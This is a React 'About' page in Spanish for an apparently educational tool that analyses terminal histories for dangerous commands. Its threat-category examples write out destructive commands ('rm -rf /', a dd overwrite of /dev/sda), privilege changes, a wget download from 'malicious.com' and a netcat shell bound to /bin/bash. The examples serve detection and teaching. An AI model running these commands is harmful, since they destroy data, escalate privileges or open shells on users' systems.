import React from 'react';
import {
    ShieldCheckIcon,
    CpuChipIcon,
    DocumentMagnifyingGlassIcon,
    ExclamationTriangleIcon,
    CodeBracketIcon,
    ServerIcon,
    AcademicCapIcon,
    LightBulbIcon
} from '@heroicons/react/24/outline';

const About = () => {
    const analysisSteps = [
        {
            step: 1,
            title: 'Análisis Léxico',
            icon: CpuChipIcon,
            description: 'Tokenización de comandos, argumentos, paths, URLs y operadores especiales.',
            details: [
                'Identificación de tipos de tokens',
                'Validación de sintaxis básica',
                'Detección de caracteres especiales',
                'Manejo de strings y variables'
            ]
        },
        {
            step: 2,
            title: 'Análisis Sintáctico',
            icon: DocumentMagnifyingGlassIcon,
            description: 'Validación de estructura correcta de comandos de shell.',
            details: [
                'Parsing de comandos complejos',
                'Manejo de pipes y redirecciones',
                'Validación de flags y argumentos',
                'Detección de errores sintácticos'
            ]
        },
        {
            step: 3,
            title: 'Análisis Semántico',
            icon: ExclamationTriangleIcon,
            description: 'Detección de comandos peligrosos y patrones sospechosos.',
            details: [
                'Identificación de amenazas por niveles',
                'Detección de patrones maliciosos',
                'Análisis de comportamiento anómalo',
                'Generación de recomendaciones'
            ]
        }
    ];

    const threatCategories = [
        {
            level: 'CRITICAL',
            color: 'text-red-600',
            bgColor: 'bg-red-50',
            borderColor: 'border-red-200',
            title: 'Críticas',
            description: 'Comandos extremadamente peligrosos que pueden causar daño irreversible al sistema.',
            examples: [
                'rm -rf / - Eliminación del sistema de archivos completo',
                'dd if=/dev/zero of=/dev/sda - Sobrescritura del disco duro',
                'mkfs.ext4 /dev/sda1 - Formateo de particiones del sistema'
            ]
        },
        {
            level: 'HIGH',
            color: 'text-orange-600',
            bgColor: 'bg-orange-50',
            borderColor: 'border-orange-200',
            title: 'Altas',
            description: 'Comandos de escalación de privilegios y modificaciones críticas del sistema.',
            examples: [
                'sudo su - - Cambio a usuario root',
                'chmod 777 / - Permisos peligrosos en directorio raíz',
                'usermod -a -G sudo user - Adición a grupo sudo'
            ]
        },
        {
            level: 'MEDIUM',
            color: 'text-yellow-600',
            bgColor: 'bg-yellow-50',
            borderColor: 'border-yellow-200',
            title: 'Medias',
            description: 'Actividad de red sospechosa y descargas desde fuentes no confiables.',
            examples: [
                'wget http://malicious.com/script.sh - Descarga sospechosa',
                'ssh root@unknown-server - Conexión SSH como root',
                'nc -l -p 4444 -e /bin/bash - Reverse shell con netcat'
            ]
        },
        {
            level: 'LOW',
            color: 'text-blue-600',
            bgColor: 'bg-blue-50',
            borderColor: 'border-blue-200',
            title: 'Bajas',
            description: 'Actividades que requieren atención pero no son inmediatamente peligrosas.',
            examples: [
                'ssh internal-server - Conexión a servidor interno',
                'curl unknown-api.com - Consulta a API desconocida',
                'history -c - Limpieza del historial'
            ]
        }
    ];

    const technologies = [
        {
            name: 'Frontend',
            icon: CodeBracketIcon,
            tech: 'React + Tailwind CSS',
            description: 'Interfaz moderna y responsiva con componentes reutilizables'
        },
        {
            name: 'Backend',
            icon: ServerIcon,
            tech: 'Go + Gin Framework',
            description: 'API REST eficiente con análisis en tiempo real'
        },
        {
            name: 'Análisis',
            icon: AcademicCapIcon,
            tech: 'Algoritmos Personalizados',
            description: 'Implementación de análisis léxico, sintáctico y semántico'
        }
    ];

    return (
        <div className="min-h-screen bg-gray-50 py-12">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
                {/* Header */}
                <div className="text-center mb-16">
                    <ShieldCheckIcon className="h-16 w-16 text-primary-600 mx-auto mb-6" />
                    <h1 className="text-4xl font-bold text-gray-900 mb-4">
                        Acerca del Terminal History Analyzer
                    </h1>
                    <p className="text-xl text-gray-600 max-w-3xl mx-auto">
                        Una herramienta completa para analizar la seguridad de historiales de terminal,
                        detectando comandos peligrosos y patrones sospechosos mediante análisis léxico,
                        sintáctico y semántico.
                    </p>
                </div>

                {/* Analysis Steps */}
                <section className="mb-16">
                    <h2 className="text-3xl font-bold text-gray-900 text-center mb-12">
                        Proceso de Análisis
                    </h2>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                        {analysisSteps.map((step) => {
                            const Icon = step.icon;
                            return (
                                <div key={step.step} className="card text-center">
                                    <div className="bg-primary-100 rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-6">
                    <span className="text-primary-600 font-bold text-xl">
                      {step.step}
                    </span>
                                    </div>

                                    <Icon className="h-8 w-8 text-primary-600 mx-auto mb-4" />

                                    <h3 className="text-xl font-semibold text-gray-900 mb-3">
                                        {step.title}
                                    </h3>

                                    <p className="text-gray-600 mb-6">
                                        {step.description}
                                    </p>

                                    <ul className="text-left space-y-2">
                                        {step.details.map((detail, index) => (
                                            <li key={index} className="flex items-start text-sm text-gray-700">
                                                <span className="text-primary-600 mr-2">•</span>
                                                {detail}
                                            </li>
                                        ))}
                                    </ul>
                                </div>
                            );
                        })}
                    </div>
                </section>

                {/* Threat Categories */}
                <section className="mb-16">
                    <h2 className="text-3xl font-bold text-gray-900 text-center mb-12">
                        Categorías de Amenazas
                    </h2>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                        {threatCategories.map((category) => (
                            <div
                                key={category.level}
                                className={`card border-l-4 ${category.borderColor} ${category.bgColor}`}
                            >
                                <div className="mb-4">
                  <span className={`px-3 py-1 rounded-full text-sm font-bold ${category.color} bg-white`}>
                    {category.level}
                  </span>
                                </div>

                                <h3 className={`text-xl font-semibold mb-3 ${category.color}`}>
                                    Amenazas {category.title}
                                </h3>

                                <p className="text-gray-700 mb-6">
                                    {category.description}
                                </p>

                                <div className="space-y-2">
                                    <h4 className="font-medium text-gray-900">Ejemplos:</h4>
                                    {category.examples.map((example, index) => (
                                        <div key={index} className="bg-white p-3 rounded border">
                                            <code className="text-sm font-mono text-gray-800">
                                                {example.split(' - ')[0]}
                                            </code>
                                            <p className="text-xs text-gray-600 mt-1">
                                                {example.split(' - ')[1]}
                                            </p>
                                        </div>
                                    ))}
                                </div>
                            </div>
                        ))}
                    </div>
                </section>

                {/* Technologies */}
                <section className="mb-16">
                    <h2 className="text-3xl font-bold text-gray-900 text-center mb-12">
                        Tecnologías Utilizadas
                    </h2>

                    <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
                        {technologies.map((tech, index) => {
                            const Icon = tech.icon;
                            return (
                                <div key={index} className="card text-center">
                                    <Icon className="h-12 w-12 text-primary-600 mx-auto mb-4" />
                                    <h3 className="text-xl font-semibold text-gray-900 mb-2">
                                        {tech.name}
                                    </h3>
                                    <p className="font-medium text-primary-600 mb-3">
                                        {tech.tech}
                                    </p>
                                    <p className="text-gray-600">
                                        {tech.description}
                                    </p>
                                </div>
                            );
                        })}
                    </div>
                </section>

                {/* Features */}
                <section className="mb-16">
                    <h2 className="text-3xl font-bold text-gray-900 text-center mb-12">
                        Características Principales
                    </h2>

                    <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                        <div className="card">
                            <LightBulbIcon className="h-8 w-8 text-primary-600 mb-4" />
                            <h3 className="text-xl font-semibold text-gray-900 mb-3">
                                Análisis Inteligente
                            </h3>
                            <ul className="space-y-2 text-gray-700">
                                <li>• Detección automática de patrones maliciosos</li>
                                <li>• Clasificación inteligente por niveles de peligro</li>
                                <li>• Análisis de correlación entre comandos</li>
                                <li>• Identificación de anomalías en el comportamiento</li>
                            </ul>
                        </div>

                        <div className="card">
                            <ShieldCheckIcon className="h-8 w-8 text-primary-600 mb-4" />
                            <h3 className="text-xl font-semibold text-gray-900 mb-3">
                                Seguridad y Privacidad
                            </h3>
                            <ul className="space-y-2 text-gray-700">
                                <li>• Análisis local sin envío de datos externos</li>
                                <li>• No almacenamiento permanente de historiales</li>
                                <li>• Procesamiento en tiempo real</li>
                                <li>• Recomendaciones personalizadas de seguridad</li>
                            </ul>
                        </div>
                    </div>
                </section>

                {/* Use Cases */}
                <section className="mb-16">
                    <div className="card bg-primary-50 border-primary-200">
                        <h2 className="text-2xl font-bold text-gray-900 mb-6">
                            ¿Cuándo usar Terminal History Analyzer?
                        </h2>

                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                            <div>
                                <h3 className="font-semibold text-gray-900 mb-3">
                                    Administradores de Sistemas
                                </h3>
                                <ul className="space-y-1 text-gray-700">
                                    <li>• Auditoría de actividad en servidores</li>
                                    <li>• Detección de comandos no autorizados</li>
                                    <li>• Análisis forense de incidentes</li>
                                    <li>• Monitoreo de escalación de privilegios</li>
                                </ul>
                            </div>

                            <div>
                                <h3 className="font-semibold text-gray-900 mb-3">
                                    Profesionales de Seguridad
                                </h3>
                                <ul className="space-y-1 text-gray-700">
                                    <li>• Investigación de amenazas internas</li>
                                    <li>• Análisis de comportamiento anómalo</li>
                                    <li>• Evaluación de riesgos de seguridad</li>
                                    <li>• Documentación de evidencias</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </section>

                {/* Footer Info */}
                <section className="text-center">
                    <div className="card">
                        <h2 className="text-2xl font-bold text-gray-900 mb-4">
                            Proyecto Educativo
                        </h2>
                        <p className="text-gray-600 mb-6">
                            Este analizador fue desarrollado como proyecto educativo para demostrar
                            la implementación de análisis léxico, sintáctico y semántico en el contexto
                            de seguridad informática.
                        </p>
                        <div className="flex justify-center space-x-4 text-sm text-gray-500">
                            <span>Análisis Léxico</span>
                            <span>•</span>
                            <span>Análisis Sintáctico</span>
                            <span>•</span>
                            <span>Análisis Semántico</span>
                            <span>•</span>
                            <span>Detección de Amenazas</span>
                        </div>
                    </div>
                </section>
            </div>
        </div>
    );
};

export default About;